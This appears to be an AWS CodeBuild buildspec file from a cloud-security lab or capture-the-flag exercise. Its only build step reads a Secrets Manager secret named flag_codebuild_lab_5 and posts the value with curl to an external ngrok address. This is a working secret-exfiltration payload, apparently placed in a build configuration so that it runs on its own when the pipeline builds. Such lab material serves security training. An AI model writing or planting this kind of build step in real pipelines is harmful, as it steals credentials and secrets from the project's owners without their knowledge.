version: 0.2
phases:
  pre_build:
    commands:
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      - curl -X POST https://theosophically-uncancelled-pasquale.ngrok-free.dev --data "flag=$FLAG"
# update
